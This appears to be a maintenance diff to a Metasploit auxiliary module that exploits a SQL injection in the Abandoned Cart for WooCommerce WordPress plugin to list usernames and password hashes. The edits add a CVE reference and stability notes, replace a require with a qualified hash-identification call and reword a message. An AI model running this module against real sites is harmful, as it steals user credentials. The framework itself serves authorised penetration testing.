@@ -8,8 +8,6 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::SQLi
 
-  require 'metasploit/framework/hashes/identify'
-
   def initialize(info = {})
     super(
       update_info(
@@ -22,21 +20,25 @@ class MetasploitModule < Msf::Auxiliary
           wp_woocommerce_session cookie is required, which has at least one item in the
           cart.
         },
-        'Author' =>
-          [
-            'h00die', # msf module
-            'WPDeeply', # Discovery and PoC
-          ],
+        'Author' => [
+          'h00die', # msf module
+          'WPDeeply', # Discovery and PoC
+        ],
         'License' => MSF_LICENSE,
-        'References' =>
-          [
-            ['WPVDB', '10461'],
-            ['URL', 'https://wpdeeply.com/woocommerce-abandoned-cart-before-5-8-2-sql-injection/'],
-            ['URL', 'https://plugins.trac.wordpress.org/changeset/2413885']
-          ],
+        'References' => [
+          ['CVE', '2025-47608'],
+          ['WPVDB', '10461'],
+          ['URL', 'https://wpdeeply.com/woocommerce-abandoned-cart-before-5-8-2-sql-injection/'],
+          ['URL', 'https://plugins.trac.wordpress.org/changeset/2413885']
+        ],
         'Actions' => [
           ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }]
         ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => [IOC_IN_LOGS]
+        },
         'DefaultAction' => 'List Users',
         'DisclosureDate' => '2020-11-05'
       )
@@ -59,7 +61,7 @@ class MetasploitModule < Msf::Auxiliary
       vprint_error('Abandoned Cart for WooCommerce version not vulnerable')
       return
     end
-    print_good('Vulnerable version detected')
+    print_good('Vulnerable version of Abandoned Cart for WooCommerce detected')
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, datastore['CHECKOUTURL']),
@@ -123,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
         module_fullname: fullname,
         username: user[0],
         private_type: :nonreplayable_hash,
-        jtr_format: identify_hash(user[1]),
+        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),
         private_data: user[1],
         service_name: 'Wordpress',
         address: ip,
